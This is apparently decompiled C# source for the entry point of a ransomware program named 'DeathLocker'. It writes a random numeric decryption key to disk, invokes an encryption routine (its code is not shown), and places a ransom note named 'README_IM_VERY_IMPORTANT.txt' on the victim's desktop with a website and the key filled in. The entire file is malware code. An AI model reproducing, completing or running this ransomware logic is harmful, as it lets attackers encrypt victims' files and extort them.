using System;
using System.IO;
using System.Windows.Forms;
using DeathLocker.Properties;

namespace DeathLocker;

internal class Program
{
	[STAThread]
	private static void Main()
	{
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		if (0 == 0)
		{
			Random random = new Random();
			string text = random.Next(100001, 999999).ToString();
			File.WriteAllText("C:\\DecryptKey.priv", text);
			File.Create("C:\\Users\\" + Environment.UserName + "\\Downloads\\encrypt.txt");
			Encrypt encrypt = new Encrypt();
			encrypt.EncryptTool();
			Config config = new Config();
			File.WriteAllBytes("C:\\Users\\" + Environment.UserName + "\\Desktop\\README_IM_VERY_IMPORTANT.txt", Resources.Ext);
			string text2 = File.ReadAllText("C:\\Users\\" + Environment.UserName + "\\Desktop\\README_IM_VERY_IMPORTANT.txt");
			text2 = text2.Replace("%website%", config.website).Replace("%priv_key%", text);
			File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Desktop\\README_IM_VERY_IMPORTANT.txt", text2);
		}
		else
		{
			MessageBox.Show("You protected from infection!", "SafeGuard", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
	}
}
